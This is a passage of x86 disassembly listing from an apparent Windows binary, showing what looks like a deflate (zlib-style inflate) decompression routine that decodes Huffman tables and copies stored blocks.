  406c0b:	0f 85 a0 00 00 00    	jne    0x406cb1
  406c11:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  406c15:	b8 10 15 43 00       	mov    $0x431510,%eax
  406c1a:	3d 4c 17 43 00       	cmp    $0x43174c,%eax
  406c1f:	b1 08                	mov    $0x8,%cl
  406c21:	7e 14                	jle    0x406c37
  406c23:	3d 10 19 43 00       	cmp    $0x431910,%eax
  406c28:	7d 04                	jge    0x406c2e
  406c2a:	fe c1                	inc    %cl
  406c2c:	eb 09                	jmp    0x406c37
  406c2e:	3d 70 19 43 00       	cmp    $0x431970,%eax
  406c33:	7d 02                	jge    0x406c37
  406c35:	b1 07                	mov    $0x7,%cl
  406c37:	0f be c9             	movsbl %cl,%ecx
  406c3a:	89 08                	mov    %ecx,(%eax)
  406c3c:	83 c0 04             	add    $0x4,%eax
  406c3f:	3d 90 19 43 00       	cmp    $0x431990,%eax
  406c44:	7c d4                	jl     0x406c1a
  406c46:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406c49:	bf 10 15 43 00       	mov    $0x431510,%edi
  406c4e:	50                   	push   %eax
  406c4f:	68 10 1e 43 00       	push   $0x431e10
  406c54:	68 e8 a5 40 00       	push   $0x40a5e8
  406c59:	68 0c 15 43 00       	push   $0x43150c
  406c5e:	68 20 85 40 00       	push   $0x408520
  406c63:	68 e0 84 40 00       	push   $0x4084e0
  406c68:	68 01 01 00 00       	push   $0x101
  406c6d:	68 20 01 00 00       	push   $0x120
  406c72:	57                   	push   %edi
  406c73:	e8 80 09 00 00       	call   0x4075f8
  406c78:	6a 1e                	push   $0x1e
  406c7a:	59                   	pop    %ecx
  406c7b:	6a 05                	push   $0x5
  406c7d:	58                   	pop    %eax
  406c7e:	f3 ab                	rep stos %eax,%es:(%edi)
  406c80:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406c83:	50                   	push   %eax
  406c84:	68 10 1e 43 00       	push   $0x431e10
  406c89:	68 ec a5 40 00       	push   $0x40a5ec
  406c8e:	68 08 15 43 00       	push   $0x431508
  406c93:	68 9c 85 40 00       	push   $0x40859c
  406c98:	68 60 85 40 00       	push   $0x408560
  406c9d:	6a 00                	push   $0x0
  406c9f:	6a 1e                	push   $0x1e
  406ca1:	68 10 15 43 00       	push   $0x431510
  406ca6:	e8 4d 09 00 00       	call   0x4075f8
  406cab:	fe 05 90 26 43 00    	incb   0x432690
  406cb1:	a0 e8 a5 40 00       	mov    0x40a5e8,%al
  406cb6:	88 46 10             	mov    %al,0x10(%esi)
  406cb9:	a0 ec a5 40 00       	mov    0x40a5ec,%al
  406cbe:	88 46 11             	mov    %al,0x11(%esi)
  406cc1:	a1 0c 15 43 00       	mov    0x43150c,%eax
  406cc6:	89 46 14             	mov    %eax,0x14(%esi)
  406cc9:	a1 08 15 43 00       	mov    0x431508,%eax
  406cce:	89 46 18             	mov    %eax,0x18(%esi)
  406cd1:	83 26 00             	andl   $0x0,(%esi)
  406cd4:	e9 3c 08 00 00       	jmp    0x407515
  406cd9:	8b cb                	mov    %ebx,%ecx
  406cdb:	c7 06 09 00 00 00    	movl   $0x9,(%esi)
  406ce1:	83 e1 07             	and    $0x7,%ecx
  406ce4:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  406ce7:	2b d9                	sub    %ecx,%ebx
  406ce9:	e9 27 08 00 00       	jmp    0x407515
  406cee:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  406cf2:	0f 84 2d 08 00 00    	je     0x407525
  406cf8:	8b 45 c8             	mov    -0x38(%ebp),%eax
  406cfb:	ff 4d cc             	decl   -0x34(%ebp)
  406cfe:	8b cb                	mov    %ebx,%ecx
  406d00:	0f b6 00             	movzbl (%eax),%eax
  406d03:	d3 e0                	shl    %cl,%eax
  406d05:	09 45 c0             	or     %eax,-0x40(%ebp)
  406d08:	ff 45 c8             	incl   -0x38(%ebp)
  406d0b:	83 c3 08             	add    $0x8,%ebx
  406d0e:	83 fb 20             	cmp    $0x20,%ebx
  406d11:	72 db                	jb     0x406cee
  406d13:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406d16:	33 db                	xor    %ebx,%ebx
  406d18:	25 ff ff 00 00       	and    $0xffff,%eax
  406d1d:	89 5d c0             	mov    %ebx,-0x40(%ebp)
  406d20:	3b c3                	cmp    %ebx,%eax
  406d22:	89 46 04             	mov    %eax,0x4(%esi)
  406d25:	0f 84 e9 00 00 00    	je     0x406e14
  406d2b:	6a 0a                	push   $0xa
  406d2d:	58                   	pop    %eax
  406d2e:	e9 e7 00 00 00       	jmp    0x406e1a
  406d33:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  406d37:	0f 84 e8 07 00 00    	je     0x407525
  406d3d:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  406d40:	85 c0                	test   %eax,%eax
  406d42:	0f 85 98 00 00 00    	jne    0x406de0
  406d48:	8b 8e a0 9b 00 00    	mov    0x9ba0(%esi),%ecx
  406d4e:	8b 55 d0             	mov    -0x30(%ebp),%edx
  406d51:	3b d1                	cmp    %ecx,%edx
  406d53:	75 29                	jne    0x406d7e
  406d55:	8b 86 a4 9b 00 00    	mov    0x9ba4(%esi),%eax
  406d5b:	8d be a0 1b 00 00    	lea    0x1ba0(%esi),%edi
  406d61:	3b c7                	cmp    %edi,%eax
  406d63:	74 19                	je     0x406d7e
  406d65:	8b d7                	mov    %edi,%edx
  406d67:	3b d0                	cmp    %eax,%edx
  406d69:	89 55 d0             	mov    %edx,-0x30(%ebp)
  406d6c:	73 05                	jae    0x406d73
  406d6e:	2b c2                	sub    %edx,%eax
  406d70:	48                   	dec    %eax
  406d71:	eb 04                	jmp    0x406d77
  406d73:	2b ca                	sub    %edx,%ecx
  406d75:	8b c1                	mov    %ecx,%eax
  406d77:	85 c0                	test   %eax,%eax
  406d79:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  406d7c:	75 62                	jne    0x406de0
  406d7e:	ff 75 08             	push   0x8(%ebp)
  406d81:	89 96 a8 9b 00 00    	mov    %edx,0x9ba8(%esi)
  406d87:	e8 04 08 00 00       	call   0x407590
  406d8c:	8b 96 a8 9b 00 00    	mov    0x9ba8(%esi),%edx
  406d92:	8b 8e a4 9b 00 00    	mov    0x9ba4(%esi),%ecx
  406d98:	3b d1                	cmp    %ecx,%edx
  406d9a:	89 55 d0             	mov    %edx,-0x30(%ebp)
  406d9d:	73 07                	jae    0x406da6
  406d9f:	8b c1                	mov    %ecx,%eax
  406da1:	2b c2                	sub    %edx,%eax
  406da3:	48                   	dec    %eax
  406da4:	eb 08                	jmp    0x406dae
  406da6:	8b 86 a0 9b 00 00    	mov    0x9ba0(%esi),%eax
  406dac:	2b c2                	sub    %edx,%eax
  406dae:	8b be a0 9b 00 00    	mov    0x9ba0(%esi),%edi
  406db4:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  406db7:	3b d7                	cmp    %edi,%edx
  406db9:	75 1d                	jne    0x406dd8
  406dbb:	8d 96 a0 1b 00 00    	lea    0x1ba0(%esi),%edx
  406dc1:	3b d1                	cmp    %ecx,%edx
  406dc3:	74 13                	je     0x406dd8
  406dc5:	89 55 d0             	mov    %edx,-0x30(%ebp)
  406dc8:	73 07                	jae    0x406dd1
  406dca:	2b ca                	sub    %edx,%ecx
  406dcc:	49                   	dec    %ecx
  406dcd:	8b c1                	mov    %ecx,%eax
  406dcf:	eb 04                	jmp    0x406dd5
  406dd1:	2b fa                	sub    %edx,%edi
  406dd3:	8b c7                	mov    %edi,%eax
  406dd5:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  406dd8:	85 c0                	test   %eax,%eax
  406dda:	0f 84 61 07 00 00    	je     0x407541
  406de0:	3b 45 cc             	cmp    -0x34(%ebp),%eax
  406de3:	72 03                	jb     0x406de8
  406de5:	8b 45 cc             	mov    -0x34(%ebp),%eax
  406de8:	8b 4e 04             	mov    0x4(%esi),%ecx
  406deb:	3b c8                	cmp    %eax,%ecx
  406ded:	8b f9                	mov    %ecx,%edi
  406def:	72 02                	jb     0x406df3
  406df1:	8b f8                	mov    %eax,%edi
  406df3:	57                   	push   %edi
  406df4:	ff 75 c8             	push   -0x38(%ebp)
  406df7:	ff 75 d0             	push   -0x30(%ebp)
  406dfa:	e8 5e f2 ff ff       	call   0x40605d
  406dff:	01 7d c8             	add    %edi,-0x38(%ebp)
  406e02:	29 7d cc             	sub    %edi,-0x34(%ebp)
  406e05:	01 7d d0             	add    %edi,-0x30(%ebp)
  406e08:	29 7d d4             	sub    %edi,-0x2c(%ebp)
  406e0b:	29 7e 04             	sub    %edi,0x4(%esi)
  406e0e:	0f 85 01 07 00 00    	jne    0x407515
  406e14:	8b 86 14 05 00 00    	mov    0x514(%esi),%eax
  406e1a:	89 06                	mov    %eax,(%esi)
  406e1c:	e9 f4 06 00 00       	jmp    0x407515
  406e21:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  406e25:	0f 84 fa 06 00 00    	je     0x407525
  406e2b:	8b 45 c8             	mov    -0x38(%ebp),%eax
  406e2e:	ff 4d cc             	decl   -0x34(%ebp)
  406e31:	8b cb                	mov    %ebx,%ecx
  406e33:	0f b6 00             	movzbl (%eax),%eax
  406e36:	d3 e0                	shl    %cl,%eax
  406e38:	09 45 c0             	or     %eax,-0x40(%ebp)
  406e3b:	ff 45 c8             	incl   -0x38(%ebp)
  406e3e:	83 c3 08             	add    $0x8,%ebx
  406e41:	83 fb 0e             	cmp    $0xe,%ebx
  406e44:	72 db                	jb     0x406e21
  406e46:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406e49:	25 ff 3f 00 00       	and    $0x3fff,%eax
  406e4e:	8b c8                	mov    %eax,%ecx
  406e50:	89 46 04             	mov    %eax,0x4(%esi)
  406e53:	83 e1 1f             	and    $0x1f,%ecx
  406e56:	80 f9 1d             	cmp    $0x1d,%cl
  406e59:	0f 87 59 fd ff ff    	ja     0x406bb8
  406e5f:	25 e0 03 00 00       	and    $0x3e0,%eax
  406e64:	3d a0 03 00 00       	cmp    $0x3a0,%eax
  406e69:	0f 87 49 fd ff ff    	ja     0x406bb8
  406e6f:	c1 6d c0 0e          	shrl   $0xe,-0x40(%ebp)
  406e73:	83 eb 0e             	sub    $0xe,%ebx
  406e76:	83 66 08 00          	andl   $0x0,0x8(%esi)
  406e7a:	c7 06 0c 00 00 00    	movl   $0xc,(%esi)
  406e80:	8b 46 04             	mov    0x4(%esi),%eax
  406e83:	c1 e8 0a             	shr    $0xa,%eax
  406e86:	83 c0 04             	add    $0x4,%eax
  406e89:	39 46 08             	cmp    %eax,0x8(%esi)
  406e8c:	73 69                	jae    0x406ef7
  406e8e:	eb 20                	jmp    0x406eb0
  406e90:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  406e94:	0f 84 8b 06 00 00    	je     0x407525
  406e9a:	8b 45 c8             	mov    -0x38(%ebp),%eax
  406e9d:	ff 4d cc             	decl   -0x34(%ebp)
  406ea0:	8b cb                	mov    %ebx,%ecx
  406ea2:	0f b6 00             	movzbl (%eax),%eax
  406ea5:	d3 e0                	shl    %cl,%eax
  406ea7:	09 45 c0             	or     %eax,-0x40(%ebp)
  406eaa:	ff 45 c8             	incl   -0x38(%ebp)
  406ead:	83 c3 08             	add    $0x8,%ebx
  406eb0:	83 fb 03             	cmp    $0x3,%ebx
  406eb3:	72 db                	jb     0x406e90
  406eb5:	8b 4e 08             	mov    0x8(%esi),%ecx
  406eb8:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406ebb:	83 e0 07             	and    $0x7,%eax
  406ebe:	83 eb 03             	sub    $0x3,%ebx
  406ec1:	0f be 89 cc 84 40 00 	movsbl 0x4084cc(%ecx),%ecx
  406ec8:	c1 6d c0 03          	shrl   $0x3,-0x40(%ebp)
  406ecc:	89 44 8e 0c          	mov    %eax,0xc(%esi,%ecx,4)
  406ed0:	8b 4e 04             	mov    0x4(%esi),%ecx
  406ed3:	ff 46 08             	incl   0x8(%esi)
  406ed6:	8b 46 08             	mov    0x8(%esi),%eax
  406ed9:	c1 e9 0a             	shr    $0xa,%ecx
  406edc:	83 c1 04             	add    $0x4,%ecx
  406edf:	3b c1                	cmp    %ecx,%eax
  406ee1:	72 cd                	jb     0x406eb0
  406ee3:	eb 12                	jmp    0x406ef7
  406ee5:	8b 46 08             	mov    0x8(%esi),%eax
  406ee8:	0f be 80 cc 84 40 00 	movsbl 0x4084cc(%eax),%eax
  406eef:	83 64 86 0c 00       	andl   $0x0,0xc(%esi,%eax,4)
  406ef4:	ff 46 08             	incl   0x8(%esi)
  406ef7:	83 7e 08 13          	cmpl   $0x13,0x8(%esi)
  406efb:	72 e8                	jb     0x406ee5
  406efd:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  406f00:	8d be 0c 05 00 00    	lea    0x50c(%esi),%edi
  406f06:	51                   	push   %ecx
  406f07:	8d 8e 20 05 00 00    	lea    0x520(%esi),%ecx
  406f0d:	51                   	push   %ecx
  406f0e:	8d 8e 10 05 00 00    	lea    0x510(%esi),%ecx
  406f14:	33 c0                	xor    %eax,%eax
  406f16:	57                   	push   %edi
  406f17:	51                   	push   %ecx
  406f18:	50                   	push   %eax
  406f19:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406f1c:	50                   	push   %eax
  406f1d:	6a 13                	push   $0x13
  406f1f:	8d 46 0c             	lea    0xc(%esi),%eax
  406f22:	6a 13                	push   $0x13
  406f24:	50                   	push   %eax
  406f25:	c7 07 07 00 00 00    	movl   $0x7,(%edi)
  406f2b:	e8 c8 06 00 00       	call   0x4075f8
  406f30:	85 c0                	test   %eax,%eax
  406f32:	75 12                	jne    0x406f46
  406f34:	39 07                	cmp    %eax,(%edi)
  406f36:	74 0e                	je     0x406f46
  406f38:	21 46 08             	and    %eax,0x8(%esi)
  406f3b:	c7 06 0d 00 00 00    	movl   $0xd,(%esi)
  406f41:	e9 1d 01 00 00       	jmp    0x407063
  406f46:	c7 06 11 00 00 00    	movl   $0x11,(%esi)
  406f4c:	e9 c4 05 00 00       	jmp    0x407515
  406f51:	8b 86 0c 05 00 00    	mov    0x50c(%esi),%eax
  406f57:	eb 20                	jmp    0x406f79
  406f59:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  406f5d:	0f 84 c2 05 00 00    	je     0x407525
  406f63:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406f66:	ff 4d cc             	decl   -0x34(%ebp)
  406f69:	0f b6 11             	movzbl (%ecx),%edx
  406f6c:	8b cb                	mov    %ebx,%ecx
  406f6e:	d3 e2                	shl    %cl,%edx
  406f70:	09 55 c0             	or     %edx,-0x40(%ebp)
  406f73:	ff 45 c8             	incl   -0x38(%ebp)
  406f76:	83 c3 08             	add    $0x8,%ebx
  406f79:	3b d8                	cmp    %eax,%ebx
  406f7b:	72 dc                	jb     0x406f59
  406f7d:	0f b7 04 45 c4 a5 40 	movzwl 0x40a5c4(,%eax,2),%eax
  406f84:	00 
  406f85:	23 45 c0             	and    -0x40(%ebp),%eax
  406f88:	8b 8e 10 05 00 00    	mov    0x510(%esi),%ecx
  406f8e:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  406f91:	0f b6 50 01          	movzbl 0x1(%eax),%edx
  406f95:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  406f99:	83 f8 10             	cmp    $0x10,%eax
  406f9c:	89 45 ec             	mov    %eax,-0x14(%ebp)
  406f9f:	73 16                	jae    0x406fb7
  406fa1:	8b ca                	mov    %edx,%ecx
  406fa3:	2b da                	sub    %edx,%ebx
  406fa5:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  406fa8:	8b 4e 08             	mov    0x8(%esi),%ecx
  406fab:	89 44 8e 0c          	mov    %eax,0xc(%esi,%ecx,4)
  406faf:	ff 46 08             	incl   0x8(%esi)
  406fb2:	e9 ac 00 00 00       	jmp    0x407063
  406fb7:	83 f8 12             	cmp    $0x12,%eax
  406fba:	75 0c                	jne    0x406fc8
  406fbc:	6a 07                	push   $0x7
  406fbe:	c7 45 f8 0b 00 00 00 	movl   $0xb,-0x8(%ebp)
  406fc5:	58                   	pop    %eax
  406fc6:	eb 2c                	jmp    0x406ff4
  406fc8:	83 c0 f2             	add    $0xfffffff2,%eax
  406fcb:	c7 45 f8 03 00 00 00 	movl   $0x3,-0x8(%ebp)
  406fd2:	eb 20                	jmp    0x406ff4
  406fd4:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  406fd8:	0f 84 47 05 00 00    	je     0x407525
  406fde:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406fe1:	ff 4d cc             	decl   -0x34(%ebp)
  406fe4:	0f b6 39             	movzbl (%ecx),%edi
  406fe7:	8b cb                	mov    %ebx,%ecx
  406fe9:	d3 e7                	shl    %cl,%edi
  406feb:	09 7d c0             	or     %edi,-0x40(%ebp)
  406fee:	ff 45 c8             	incl   -0x38(%ebp)
  406ff1:	83 c3 08             	add    $0x8,%ebx
  406ff4:	8d 0c 10             	lea    (%eax,%edx,1),%ecx
  406ff7:	3b d9                	cmp    %ecx,%ebx
  406ff9:	72 d9                	jb     0x406fd4
  406ffb:	8b ca                	mov    %edx,%ecx
  406ffd:	2b da                	sub    %edx,%ebx
  406fff:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  407002:	0f b7 0c 45 c4 a5 40 	movzwl 0x40a5c4(,%eax,2),%ecx
  407009:	00 
  40700a:	23 4d c0             	and    -0x40(%ebp),%ecx
  40700d:	8b 55 f8             	mov    -0x8(%ebp),%edx
  407010:	2b d8                	sub    %eax,%ebx
  407012:	03 d1                	add    %ecx,%edx
  407014:	8b c8                	mov    %eax,%ecx
  407016:	8b 46 04             	mov    0x4(%esi),%eax
  407019:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  40701c:	8b 4e 08             	mov    0x8(%esi),%ecx
  40701f:	8b f8                	mov    %eax,%edi
  407021:	c1 ef 05             	shr    $0x5,%edi
  407024:	83 e7 1f             	and    $0x1f,%edi
  407027:	83 e0 1f             	and    $0x1f,%eax
  40702a:	8d 84 07 02 01 00 00 	lea    0x102(%edi,%eax,1),%eax
  407031:	8d 3c 0a             	lea    (%edx,%ecx,1),%edi
  407034:	3b f8                	cmp    %eax,%edi
  407036:	0f 87 7c fb ff ff    	ja     0x406bb8
  40703c:	83 7d ec 10          	cmpl   $0x10,-0x14(%ebp)
  407040:	75 0f                	jne    0x407051
  407042:	83 f9 01             	cmp    $0x1,%ecx
  407045:	0f 82 6d fb ff ff    	jb     0x406bb8
  40704b:	8b 7c 8e 08          	mov    0x8(%esi,%ecx,4),%edi
  40704f:	eb 02                	jmp    0x407053
  407051:	33 ff                	xor    %edi,%edi
  407053:	8d 44 8e 0c          	lea    0xc(%esi,%ecx,4),%eax
  407057:	89 38                	mov    %edi,(%eax)
  407059:	41                   	inc    %ecx
  40705a:	83 c0 04             	add    $0x4,%eax
  40705d:	4a                   	dec    %edx
  40705e:	75 f7                	jne    0x407057
  407060:	89 4e 08             	mov    %ecx,0x8(%esi)
  407063:	8b 46 04             	mov    0x4(%esi),%eax
  407066:	8b 4e 08             	mov    0x8(%esi),%ecx
  407069:	8b d0                	mov    %eax,%edx
  40706b:	83 e0 1f             	and    $0x1f,%eax
  40706e:	c1 ea 05             	shr    $0x5,%edx
  407071:	83 e2 1f             	and    $0x1f,%edx
  407074:	8d 84 02 02 01 00 00 	lea    0x102(%edx,%eax,1),%eax
  40707b:	3b c8                	cmp    %eax,%ecx
  40707d:	0f 82 ce fe ff ff    	jb     0x406f51
  407083:	8b 46 04             	mov    0x4(%esi),%eax
  407086:	83 a6 10 05 00 00 00 	andl   $0x0,0x510(%esi)
  40708d:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  407091:	8b f8                	mov    %eax,%edi
  407093:	c1 e8 05             	shr    $0x5,%eax
  407096:	83 e7 1f             	and    $0x1f,%edi
  407099:	b9 01 01 00 00       	mov    $0x101,%ecx
  40709e:	83 e0 1f             	and    $0x1f,%eax
  4070a1:	03 f9                	add    %ecx,%edi
  4070a3:	40                   	inc    %eax
  4070a4:	8d 55 f4             	lea    -0xc(%ebp),%edx
  4070a7:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4070aa:	8d 86 20 05 00 00    	lea    0x520(%esi),%eax
  4070b0:	52                   	push   %edx
  4070b1:	50                   	push   %eax
  4070b2:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4070b5:	c7 45 fc 09 00 00 00 	movl   $0x9,-0x4(%ebp)
  4070bc:	50                   	push   %eax
  4070bd:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4070c0:	50                   	push   %eax
  4070c1:	68 20 85 40 00       	push   $0x408520
  4070c6:	68 e0 84 40 00       	push   $0x4084e0
  4070cb:	51                   	push   %ecx
  4070cc:	8d 46 0c             	lea    0xc(%esi),%eax
  4070cf:	57                   	push   %edi
  4070d0:	50                   	push   %eax
  4070d1:	c7 45 f0 06 00 00 00 	movl   $0x6,-0x10(%ebp)
  4070d8:	e8 1b 05 00 00       	call   0x4075f8
  4070dd:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  4070e1:	75 03                	jne    0x4070e6
  4070e3:	83 c8 ff             	or     $0xffffffff,%eax
  4070e6:	85 c0                	test   %eax,%eax
  4070e8:	0f 85 ca fa ff ff    	jne    0x406bb8
  4070ee:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4070f1:	50                   	push   %eax
  4070f2:	8d 86 20 05 00 00    	lea    0x520(%esi),%eax
  4070f8:	50                   	push   %eax
  4070f9:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4070fc:	50                   	push   %eax
  4070fd:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  407100:	50                   	push   %eax
  407101:	68 9c 85 40 00       	push   $0x40859c
  407106:	68 60 85 40 00       	push   $0x408560
  40710b:	6a 00                	push   $0x0
  40710d:	ff 75 ec             	push   -0x14(%ebp)
  407110:	8d 44 be 0c          	lea    0xc(%esi,%edi,4),%eax
  407114:	50                   	push   %eax
  407115:	e8 de 04 00 00       	call   0x4075f8
  40711a:	85 c0                	test   %eax,%eax
  40711c:	0f 85 96 fa ff ff    	jne    0x406bb8
  407122:	8b 45 f0             	mov    -0x10(%ebp),%eax
  407125:	85 c0                	test   %eax,%eax
  407127:	75 0c                	jne    0x407135
  407129:	81 ff 01 01 00 00    	cmp    $0x101,%edi
  40712f:	0f 8f 83 fa ff ff    	jg     0x406bb8
  407135:	8a 4d fc             	mov    -0x4(%ebp),%cl
  407138:	83 26 00             	andl   $0x0,(%esi)
  40713b:	88 46 11             	mov    %al,0x11(%esi)
  40713e:	8b 45 e8             	mov    -0x18(%ebp),%eax
  407141:	89 46 14             	mov    %eax,0x14(%esi)
  407144:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  407147:	88 4e 10             	mov    %cl,0x10(%esi)
  40714a:	89 46 18             	mov    %eax,0x18(%esi)
  40714d:	0f b6 46 10          	movzbl 0x10(%esi),%eax
  407151:	89 46 0c             	mov    %eax,0xc(%esi)
  407154:	8b 46 14             	mov    0x14(%esi),%eax
  407157:	89 46 08             	mov    %eax,0x8(%esi)
  40715a:	c7 06 01 00 00 00    	movl   $0x1,(%esi)
  407160:	8b 46 0c             	mov    0xc(%esi),%eax
  407163:	eb 20                	jmp    0x407185
  407165:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  407169:	0f 84 b6 03 00 00    	je     0x407525
  40716f:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  407172:	ff 4d cc             	decl   -0x34(%ebp)
  407175:	0f b6 11             	movzbl (%ecx),%edx
  407178:	8b cb                	mov    %ebx,%ecx
  40717a:	d3 e2                	shl    %cl,%edx
  40717c:	09 55 c0             	or     %edx,-0x40(%ebp)
  40717f:	ff 45 c8             	incl   -0x38(%ebp)
  407182:	83 c3 08             	add    $0x8,%ebx
  407185:	3b d8                	cmp    %eax,%ebx
  407187:	72 dc                	jb     0x407165
  407189:	0f b7 04 45 c4 a5 40 	movzwl 0x40a5c4(,%eax,2),%eax
  407190:	00 
  407191:	23 45 c0             	and    -0x40(%ebp),%eax
  407194:	8b 4e 08             	mov    0x8(%esi),%ecx
  407197:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  40719a:	0f b6 48 01          	movzbl 0x1(%eax),%ecx
  40719e:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  4071a1:	2b d9                	sub    %ecx,%ebx
  4071a3:	0f b6 08             	movzbl (%eax),%ecx
  4071a6:	85 c9                	test   %ecx,%ecx
  4071a8:	75 12                	jne    0x4071bc
  4071aa:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  4071ae:	89 46 08             	mov    %eax,0x8(%esi)
  4071b1:	c7 06 06 00 00 00    	movl   $0x6,(%esi)
  4071b7:	e9 59 03 00 00       	jmp    0x407515
  4071bc:	f6 c1 10             	test   $0x10,%cl
  4071bf:	74 18                	je     0x4071d9
  4071c1:	83 e1 0f             	and    $0xf,%ecx
  4071c4:	89 4e 08             	mov    %ecx,0x8(%esi)
  4071c7:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  4071cb:	89 46 04             	mov    %eax,0x4(%esi)
  4071ce:	c7 06 02 00 00 00    	movl   $0x2,(%esi)
  4071d4:	e9 3c 03 00 00       	jmp    0x407515
  4071d9:	f6 c1 40             	test   $0x40,%cl
  4071dc:	0f 84 d1 00 00 00    	je     0x4072b3
  4071e2:	f6 c1 20             	test   $0x20,%cl
  4071e5:	0f 84 cd f9 ff ff    	je     0x406bb8
  4071eb:	c7 06 07 00 00 00    	movl   $0x7,(%esi)
  4071f1:	e9 1f 03 00 00       	jmp    0x407515
  4071f6:	8b 46 08             	mov    0x8(%esi),%eax
  4071f9:	eb 20                	jmp    0x40721b
  4071fb:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  4071ff:	0f 84 20 03 00 00    	je     0x407525
  407205:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  407208:	ff 4d cc             	decl   -0x34(%ebp)
  40720b:	0f b6 11             	movzbl (%ecx),%edx
  40720e:	8b cb                	mov    %ebx,%ecx
  407210:	d3 e2                	shl    %cl,%edx
  407212:	09 55 c0             	or     %edx,-0x40(%ebp)
  407215:	ff 45 c8             	incl   -0x38(%ebp)
  407218:	83 c3 08             	add    $0x8,%ebx
  40721b:	3b d8                	cmp    %eax,%ebx
  40721d:	72 dc                	jb     0x4071fb
  40721f:	0f b7 0c 45 c4 a5 40 	movzwl 0x40a5c4(,%eax,2),%ecx
  407226:	00 
  407227:	23 4d c0             	and    -0x40(%ebp),%ecx
  40722a:	01 4e 04             	add    %ecx,0x4(%esi)
  40722d:	8b c8                	mov    %eax,%ecx
  40722f:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  407232:	2b d8                	sub    %eax,%ebx
  407234:	0f b6 46 11          	movzbl 0x11(%esi),%eax
  407238:	89 46 0c             	mov    %eax,0xc(%esi)
  40723b:	8b 46 18             	mov    0x18(%esi),%eax
  40723e:	89 46 08             	mov    %eax,0x8(%esi)
  407241:	c7 06 03 00 00 00    	movl   $0x3,(%esi)
  407247:	8b 46 0c             	mov    0xc(%esi),%eax
  40724a:	eb 20                	jmp    0x40726c
  40724c:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  407250:	0f 84 cf 02 00 00    	je     0x407525
  407256:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  407259:	ff 4d cc             	decl   -0x34(%ebp)
  40725c:	0f b6 11             	movzbl (%ecx),%edx
  40725f:	8b cb                	mov    %ebx,%ecx
  407261:	d3 e2                	shl    %cl,%edx
  407263:	09 55 c0             	or     %edx,-0x40(%ebp)
  407266:	ff 45 c8             	incl   -0x38(%ebp)
  407269:	83 c3 08             	add    $0x8,%ebx
  40726c:	3b d8                	cmp    %eax,%ebx
  40726e:	72 dc                	jb     0x40724c
  407270:	0f b7 04 45 c4 a5 40 	movzwl 0x40a5c4(,%eax,2),%eax
  407277:	00 
  407278:	23 45 c0             	and    -0x40(%ebp),%eax
  40727b:	8b 4e 08             	mov    0x8(%esi),%ecx
  40727e:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  407281:	0f b6 48 01          	movzbl 0x1(%eax),%ecx
  407285:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  407288:	2b d9                	sub    %ecx,%ebx
  40728a:	0f b6 08             	movzbl (%eax),%ecx
  40728d:	f6 c1 10             	test   $0x10,%cl
  407290:	74 18                	je     0x4072aa
  407292:	83 e1 0f             	and    $0xf,%ecx
  407295:	89 4e 08             	mov    %ecx,0x8(%esi)
  407298:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  40729c:	89 46 0c             	mov    %eax,0xc(%esi)
  40729f:	c7 06 04 00 00 00    	movl   $0x4,(%esi)
  4072a5:	e9 6b 02 00 00       	jmp    0x407515
  4072aa:	f6 c1 40             	test   $0x40,%cl
  4072ad:	0f 85 05 f9 ff ff    	jne    0x406bb8
  4072b3:	89 4e 0c             	mov    %ecx,0xc(%esi)
  4072b6:	0f b7 48 02          	movzwl 0x2(%eax),%ecx
  4072ba:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  4072bd:	89 46 08             	mov    %eax,0x8(%esi)
  4072c0:	e9 50 02 00 00       	jmp    0x407515
  4072c5:	8b 46 08             	mov    0x8(%esi),%eax
  4072c8:	eb 20                	jmp    0x4072ea
  4072ca:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  4072ce:	0f 84 51 02 00 00    	je     0x407525
  4072d4:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  4072d7:	ff 4d cc             	decl   -0x34(%ebp)
